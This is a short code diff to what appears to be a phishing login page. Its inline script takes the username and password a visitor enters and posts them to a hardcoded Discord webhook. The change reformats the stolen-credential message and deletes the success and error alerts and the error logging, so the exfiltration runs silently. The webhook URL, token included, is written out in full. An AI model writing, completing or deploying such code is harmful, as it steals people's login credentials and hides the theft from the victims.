@@ -195,7 +195,7 @@ a {
             console.log("Username:", username);
             console.log("Password:", password);
             var formData = {
-        content: "username " + username + " password" + password
+        content: "username: " + username + " password: " + password
     };
 
     fetch('https://discord.com/api/webhooks/1239728431873392650/4NHsZ7k9ceXfNYDdi1t9M-Wa9Ej4rG6wMq1oEpf6IwijdHudY8SM8bRG_R7-ReJMIDv2', {
@@ -209,11 +209,8 @@ a {
         if (!response.ok) {
             throw new Error('Network response was not ok');
         }
-        alert('Message sent successfully!');
     })
     .catch(error => {
-        console.error('There was a problem with your fetch operation:', error);
-        alert('Error: Message could not be sent');
     });
         }
     </script>
